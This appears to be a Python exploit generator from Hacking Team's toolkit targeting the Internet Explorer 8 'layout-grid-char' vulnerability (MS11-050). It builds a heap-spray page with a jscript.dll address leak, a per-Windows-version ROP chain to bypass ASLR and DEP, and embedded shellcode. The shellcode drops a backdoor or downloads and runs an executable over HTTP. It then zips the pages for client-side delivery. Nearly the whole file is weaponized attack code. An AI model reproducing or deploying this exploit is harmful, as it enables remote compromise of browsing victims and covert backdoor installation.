#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# Microsoft Internet Explorer "layout-grid-char" Remote Code Execution (MS11-050)
# Require MS11-031
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode
import jitencoder

NAME="ie8_layoutgridchar"
DESCRIPTION="Microsoft Internet Explorer 8 Layout Grid Char"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/??-??"
DOCUMENTATION["CVE Name"] = "CVE-2011-????"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-????"
DOCUMENTATION["Note"] = """This exploit bypasses ASLR and DEP by using a memory leak in jscript.dll (MS11-031
must be installed on the target system, otherwise you can add support for other
jscript.dll versions to target more systems - please read the exploit source code)."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath
		self.trigger_file = self.randfilename() + ".swf"

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Apple Safari 5.0", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

	def get_root_index_content(self):
		value = """<script>

    var x1 = new Array();
    p = "";
    derefs = "";
    n = 900;
    var idx = 0;
    
    function f() {
        p = String.fromCharCode(derefs%0x10000) + String.fromCharCode(derefs/0x10000) + "AAAAA\uFFFFAAAAAAADDDDDDDDDDAAAAAAAAAAAAA";
        for (i = 100 + idx; i < n-4; i +=4 ){
          x1[i].name = p;
          x1[i+1].value = p;
          x1[i+2].valueType = p;
        }
        setTimeout("trigger()");
    }
    function trigger() {
        if1.document.execCommand("selectAll"); 
        setTimeout("history.go(0)",2000);
    }
    
    function bot() {}
    function ptrToString(ptr) {
        var t = ptr.toString(16);
        while (t.length < 8) {
            t = "0" + t;
        }
        ad = "%u"
        for (var i=0; i<4; i++) {
            ad = ad + t.charAt(4+i)
        }
        ad += "%u"
        for (var i=0; i<4; i++) {
            ad = ad + t.charAt(i)
        }
        return ad;
    }
    
    function test(){
        var opt = document.createElement("option");
        var a = new Array();
        
        var payload = "\uf489#{shellcode}";
        
        a[0]=payload;
        
        setInterval("bot", typeof(a));
        jscriptptr = opt.index;
    
        var opt2 = document.createElement("option");
        setInterval("bot", a[2]);
        payloadptr = opt2.index + 0x3C;
    
        var xchgeaxesp;
        var vprotect;
        var popeax;
        var moveax;
        var base;
        var calleax;

        if (jscriptptr % 0x10000 == 0xF868) {
            base = jscriptptr - 0x9F878;
            xchgeaxesp = base + 0x33E71 + 0x00000000 +0x10;
            vprotect =  base + 0x1258 +0x10;
            popeax =  base + 0x3063 +0x10;
            moveax =  base + 0x2901D +0x10;
            calleax =  base + 0x2450F +0x10;
        } else if (jscriptptr % 0x10000 == 0xF878) {
            if (/Windows NT (\d+\.\d+);/.test(navigator.userAgent)){
                var winver=new Number(RegExp.$1)
                if (winver==6.0) {
                    base = jscriptptr - 0x9F878;
                    xchgeaxesp = base + 0x32FB9 + 0x00000000;
                    vprotect =  base + 0x1258;
                    popeax =  base + 0x711B;
                    moveax =  base + 0x1AAC1;
                    calleax =  base + 0x29151;
                } else if (winver==5.1) {
                    base = jscriptptr - 0x9F878;
                    xchgeaxesp = base + 0x33D89 + 0x00000000;
                    vprotect =  base + 0x1258;
                    popeax =  base + 0x3063;
                    moveax =  base + 0x28E1D;
                    calleax =  base + 0x2430F;               
                }
            }
        } else if (jscriptptr % 0x10000 == 0xD898) {
            base = jscriptptr - 0x9D898;
            xchgeaxesp = base + 0x297F2 + 0x00000000;
            vprotect = base + 0x1224;
            popeax = base + 0x1123B;
            moveax = base + 0x16E28;
            calleax = base + 0x15CB;
        } else if (jscriptptr % 0x10000 == 0xD8A0) {
            base = jscriptptr - 0x9D8A0;
            xchgeaxesp = base + 0x2981A + 0x00000000;
            vprotect = base + 0x1224;
            popeax = base + 0x11213;
            moveax = base + 0x16E08;
            calleax = base + 0x15CB;
        } else {
            return;
        }
    
        s = unescape(ptrToString(popeax) + ptrToString(vprotect) + ptrToString(moveax)+ ptrToString(calleax) + ptrToString(payloadptr) + "%u1000%u0000%u0040%u0000" + ptrToString(payloadptr-4) + "%u9090%u9090" + ptrToString(payloadptr));
        fill = unescape("%u9090%u9090");
        
        while (s.length <0x70/2) {
            s = s + fill;
        }
        s = s + unescape(ptrToString(xchgeaxesp + 0x00000000))
        while (s.length <0x400) {
            s = s + fill;
        }
        
        var opt3 = document.createElement("option");
        setInterval("bot", s);
        derefs = opt3.index + 8;    
        init();
    }
    
    function init() {
        n = 800;
        for (i = 0; i < n; i ++ ){
          x1[i] = document.createElement("param");
        }
        for (i = 100; i < n; i ++ ){
            if (i < 100) {
                x1[i].name = p;
                x1[i].value = p;
                x1[i].valueType = p;            
            } else {
                x1[i].name = "aaaa";
                x1[i].value = "aaaaaaaa";
                x1[i].valueType = "aaaaaaaaaaaa";
            }
        }
    }
    
    
</script>
<body onload="test()">
<iframe id='if1' src="css_ie8.html"></iframe>
<iframe src="css_ie8.html"></iframe>
<script>
    setTimeout("f();");
</script>
</body>
"""

		adapter = jscript_unicode.jscript_unicode()
		
		shellcode = self.createShellcode()
		shellcode = adapter.get2(shellcode, "\u")
		#shellcode = adapter.get2(shellcode, 6, "0x074fffb8^0x075000ec^")
		
		html = value.replace("#{shellcode}", shellcode)
		return html


	def get_css_ie8_content(self):
		html = """<STYLE>
object{
float: left;
}
</STYLE>

<body>

<acronym>
aaa
</acronym>
<object>
aaa
</object>
<div>
aaa
</div>
<div style = 'layout-grid-char: 414141ex;'>
aaasss</div>


</body>
"""
		return html
		
	def makefile(self):
	
		html_index = self.get_root_index_content()
		html_css8 = self.get_css_ie8_content()
		
		#html_index6 = self.get_index6()
		#html_index8 = self.get_index8()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			tmp_css = os.tempnam()
			#tmp_index6 = os.tempnam()
			#tmp_backdoor = os.tempnam()
			
		f = open(tmp_index,mode='wb')
		f.write(html_index)
		f.close()
		
		f = open(tmp_css, mode='wb')
		f.write(html_css8)
		f.close()
		
		#f = open(tmp_index6,mode='wb')
		#f.write(html_index6)
		#f.close()
		
		#f = open(tmp_index8,mode='wb')
		#f.write(html_index8)
		#f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_index, "index.html")
		
		print "Adding css8 file"
		zip.write(tmp_css, "css_ie8.html")
		
		#if extraPath != None:
		#	print "Adding copy of backdoor"
		#	zip.write(extraPath, "backdoor.exe")

		print "Skipping backdoor"
		zip.close()
		
		try:
			os.unlink(tmp_index)
			os.unlink(tmp_css)
			#os.unlink(tmp_index6)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'
	